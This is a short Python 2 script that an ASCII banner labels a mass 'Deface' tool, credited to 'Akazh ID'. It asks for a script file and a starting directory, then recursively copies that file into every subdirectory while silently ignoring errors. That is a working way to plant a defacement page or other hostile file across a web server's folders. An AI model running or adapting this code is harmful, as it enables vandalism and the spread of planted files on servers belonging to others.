import os

print("""

 ___      ___       __        ________  ________  
|"  \    /"  |     /""\      /"       )/"       ) 
 \   \  //   |    /    \    (:   \___/(:   \___/  
 /\\  \/.    |   /' /\  \    \___  \   \___  \    
|: \.        |  //  __'  \    __/  \\   __/  \\   
|.  \    /:  | /   /  \\  \  /" \   :) /" \   :)  
|___|\__/|___|(___/    \___)(_______/ (_______/   
                  _Deface_

	Coded by 	: Akazh ID
	Facebook	: https://facebook.com/justakazh
	Github		: https://github.com/justakazh

	                                           

	""")

sc = raw_input("Your Script : ")
disk = raw_input("Start Dir : ")
print("[*] Please wait ...")


def mass(root):
	try:
		x = os.listdir(root)
		for i in x:
			folder = os.path.join(root,i)
			if os.path.isdir(folder):
				buka = open(sc, "r").read()
				path = os.path.join(folder,sc)
				open(path, "w").write(buka)
				mass(folder)
	except:
		pass

print("[!] Done !")
mass(disk)
